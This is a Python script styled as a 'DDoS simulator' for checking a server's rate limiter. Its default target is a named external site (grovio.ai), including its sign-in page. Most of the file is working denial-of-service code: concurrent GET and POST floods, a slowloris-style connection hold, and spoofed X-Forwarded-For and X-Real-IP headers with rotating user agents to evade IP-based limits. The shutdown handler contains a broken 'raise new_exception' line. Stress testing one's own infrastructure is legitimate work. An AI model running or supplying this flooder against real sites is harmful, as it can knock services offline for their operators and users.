import asyncio
import aiohttp
import random
import time
import sys
import json
from datetime import datetime

# ─── CONFIG ────────────────────────────────────────────────────────────────
CONFIG = {
    "target": "https://grovio.ai/",  # ← change to your server
    "duration": 10,                      # seconds to run
    "threads": 100,                       # concurrent attackers
    "requests_per_second": 100,          # requests per second per thread
    "attack_types": ["http-flood", "post-flood", "slowloris", "random"],
    "endpoints": [
        "/",
        "/sign-in",
    ],
}

# ─── STATS ─────────────────────────────────────────────────────────────────
stats = {
    "sent": 0,
    "success": 0,
    "failed": 0,
    "blocked": 0,       # 429 = your rate limiter working
    "start_time": None,
    "response_times": [],
}

# ─── UTILITIES ─────────────────────────────────────────────────────────────
def random_endpoint():
    return random.choice(CONFIG["endpoints"])

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

def random_payload(size=512):
    return "x" * random.randint(100, size)

def random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (Linux; Android 10; SM-G975F)",
        f"Bot/Attack-{random.randint(1, 9999)}",
    ]
    return random.choice(agents)

def fake_headers():
    return {
        "User-Agent": random_user_agent(),
        "X-Forwarded-For": random_ip(),
        "X-Real-IP": random_ip(),
        "Accept": "*/*",
        "Connection": "keep-alive",
    }

# ─── ATTACK TYPES ──────────────────────────────────────────────────────────

async def http_flood(session, target, endpoint):
    """Rapid GET requests from spoofed IPs"""
    start = time.time()
    try:
        async with session.get(
            f"{target}{endpoint}",
            headers=fake_headers(),
            timeout=aiohttp.ClientTimeout(total=3),
            allow_redirects=False,
        ) as resp:
            elapsed = (time.time() - start) * 1000
            stats["response_times"].append(elapsed)
            stats["sent"] += 1
            if resp.status == 429:
                stats["blocked"] += 1
            elif resp.status < 400:
                stats["success"] += 1
            else:
                stats["failed"] += 1
    except Exception:
        stats["sent"] += 1
        stats["failed"] += 1


async def post_flood(session, target, endpoint):
    """POST spam with random JSON payloads"""
    start = time.time()
    payload = json.dumps({"data": random_payload(), "timestamp": time.time()})
    try:
        async with session.post(
            f"{target}{endpoint}",
            data=payload,
            headers={**fake_headers(), "Content-Type": "application/json"},
            timeout=aiohttp.ClientTimeout(total=3),
            allow_redirects=False,
        ) as resp:
            elapsed = (time.time() - start) * 1000
            stats["response_times"].append(elapsed)
            stats["sent"] += 1
            if resp.status == 429:
                stats["blocked"] += 1
            elif resp.status < 400:
                stats["success"] += 1
            else:
                stats["failed"] += 1
    except Exception:
        stats["sent"] += 1
        stats["failed"] += 1


async def slowloris(session, target):
    """Open connections and trickle data slowly to tie up server"""
    start = time.time()
    try:
        # Send large content-length but drip data slowly
        async with session.post(
            f"{target}/",
            headers={
                **fake_headers(),
                "Content-Length": "99999",
                "Content-Type": "application/x-www-form-urlencoded",
                "Connection": "keep-alive",
            },
            timeout=aiohttp.ClientTimeout(total=10),
        ) as resp:
            elapsed = (time.time() - start) * 1000
            stats["response_times"].append(elapsed)
            stats["sent"] += 1
            if resp.status == 429:
                stats["blocked"] += 1
            else:
                stats["success"] += 1
    except Exception:
        stats["sent"] += 1
        stats["failed"] += 1


async def random_attack(session, target, endpoint):
    """Mix of different attack types per request"""
    choice = random.randint(0, 2)
    if choice == 0:
        await http_flood(session, target, endpoint)
    elif choice == 1:
        await post_flood(session, target, endpoint)
    else:
        await slowloris(session, target)


# ─── ATTACK THREAD ─────────────────────────────────────────────────────────
async def run_attack_thread(thread_id, attack_type, end_time):
    connector = aiohttp.TCPConnector(
        limit=100,
        ttl_dns_cache=300,
        ssl=False,
    )
    async with aiohttp.ClientSession(connector=connector) as session:
        while time.time() < end_time:
            endpoint = random_endpoint()
            target = CONFIG["target"]

            if attack_type == "http-flood":
                await http_flood(session, target, endpoint)
            elif attack_type == "post-flood":
                await post_flood(session, target, endpoint)
            elif attack_type == "slowloris":
                await slowloris(session, target)
            else:
                await random_attack(session, target, endpoint)

            # Throttle slightly to avoid killing local machine
            delay = 1.0 / CONFIG["requests_per_second"]
            await asyncio.sleep(delay)


# ─── STATS DISPLAY ─────────────────────────────────────────────────────────
def display_stats():
    elapsed = time.time() - stats["start_time"]
    avg_response = (
        sum(stats["response_times"]) / len(stats["response_times"])
        if stats["response_times"]
        else 0
    )
    rps = stats["sent"] / elapsed if elapsed > 0 else 0
    block_rate = (
        (stats["blocked"] / stats["sent"] * 100) if stats["sent"] > 0 else 0
    )

    print("\033[2J\033[H", end="")  # clear screen
    print("╔══════════════════════════════════════════════════╗")
    print("║         DDoS SIMULATOR — PYTHON VERSION          ║")
    print("╚══════════════════════════════════════════════════╝")
    print(f"\n  Target:       {CONFIG['target']}")
    print(f"  Duration:     {elapsed:.1f}s / {CONFIG['duration']}s")
    print(f"  Threads:      {CONFIG['threads']}")
    print(f"  Attack types: {', '.join(CONFIG['attack_types'])}")
    print("\n──────────────────────────────────────────────────")
    print(f"  Requests sent:    {stats['sent']}")
    print(f"  Successful (2xx): {stats['success']}")
    print(f"  Failed (err/4xx): {stats['failed']}")
    print(f"  Blocked (429):    \033[32m{stats['blocked']}\033[0m  ← rate limiter working")
    print(f"  Block rate:       \033[33m{block_rate:.1f}%\033[0m")
    print("\n──────────────────────────────────────────────────")
    print(f"  Req/sec:          {rps:.1f}")
    print(f"  Avg response:     {avg_response:.0f}ms")
    print("\n  \033[90mPress Ctrl+C to stop early\033[0m")


def print_summary():
    duration = time.time() - stats["start_time"]
    avg_response = (
        sum(stats["response_times"]) / len(stats["response_times"])
        if stats["response_times"]
        else 0
    )
    block_rate = (
        (stats["blocked"] / stats["sent"] * 100) if stats["sent"] > 0 else 0
    )
    rps = stats["sent"] / duration if duration > 0 else 0

    print("\n╔══════════════════════════════════════════════════╗")
    print("║                  FINAL REPORT                    ║")
    print("╚══════════════════════════════════════════════════╝")
    print(f"\n  Duration:         {duration:.1f}s")
    print(f"  Total requests:   {stats['sent']}")
    print(f"  Successful:       {stats['success']}")
    print(f"  Failed:           {stats['failed']}")
    print(f"  Blocked (429):    {stats['blocked']}")
    print(f"  Block rate:       {block_rate:.1f}%")
    print(f"  Avg response:     {avg_response:.0f}ms")
    print(f"  Req/sec avg:      {rps:.1f}")
    print("\n── Defense Assessment ─────────────────────────────")

    if block_rate >= 70:
        print("  \033[32m✅ STRONG — rate limiter blocked most attack traffic\033[0m")
    elif block_rate >= 30:
        print("  \033[33m⚠️  MODERATE — some protection but could be stronger\033[0m")
    else:
        print("  \033[31m❌ WEAK — most requests got through, review your rate limiting\033[0m")

    if avg_response > 2000:
        print("  \033[31m❌ Server was significantly slowed by the attack\033[0m")
    elif avg_response > 500:
        print("  \033[33m⚠️  Server showed some slowdown under load\033[0m")
    else:
        print("  \033[32m✅ Server stayed responsive under load\033[0m")

    print("\n")


# ─── STATS LOOP ────────────────────────────────────────────────────────────
async def stats_loop(end_time):
    while time.time() < end_time:
        display_stats()
        await asyncio.sleep(0.5)


# ─── MAIN ──────────────────────────────────────────────────────────────────
async def main():
    print(f"\n⚠️  Starting DDoS simulation against: {CONFIG['target']}")
    print(f"   Threads: {CONFIG['threads']} | Duration: {CONFIG['duration']}s\n")
    print("   Make sure this is YOUR server. Starting in 3 seconds...\n")
    await asyncio.sleep(3)

    stats["start_time"] = time.time()
    end_time = stats["start_time"] + CONFIG["duration"]

    # Build attack coroutines
    attack_types = CONFIG["attack_types"]
    tasks = []

    # Stats display task
    tasks.append(asyncio.create_task(stats_loop(end_time)))

    # Attack threads
    for i in range(CONFIG["threads"]):
        attack_type = attack_types[i % len(attack_types)]
        tasks.append(asyncio.create_task(run_attack_thread(i, attack_type, end_time)))

    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError:
        pass

    print_summary()


if __name__ == "__main__":
    print(__name__)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n  Stopping simulation...")
        # print(BaseException.__context__)
        raise new_exception (print(BaseException.__context__))
        print_summary()
        sys.exit(0)